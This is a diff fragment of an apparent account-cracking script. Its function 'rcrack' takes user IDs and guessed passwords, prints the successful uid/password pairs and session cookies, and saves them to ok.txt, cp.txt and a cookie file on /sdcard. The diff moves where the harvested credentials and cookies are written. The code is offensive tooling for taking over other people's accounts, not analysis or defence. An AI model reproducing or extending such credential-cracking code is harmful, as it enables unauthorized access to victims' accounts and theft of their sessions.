@@ -710,7 +710,7 @@ def rcrack(uid,pwx,tl):
 
 				print('\r\033 '+uid+' | '+ps)
 
-				print(f"  | {coki}")
+				print(f"| {coki}")
 
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 
@@ -725,9 +725,9 @@ def rcrack(uid,pwx,tl):
 				uid = coki[141:152]
 
 				
-
+				open('/sdcard/anox-22-cookie.txt','a'). write(uid+' | '+ps+' | ' +coki+'\n')
 				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
-                 open('/sdcard/ANOX420-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+
 				cps.append(uid)
 
 				break
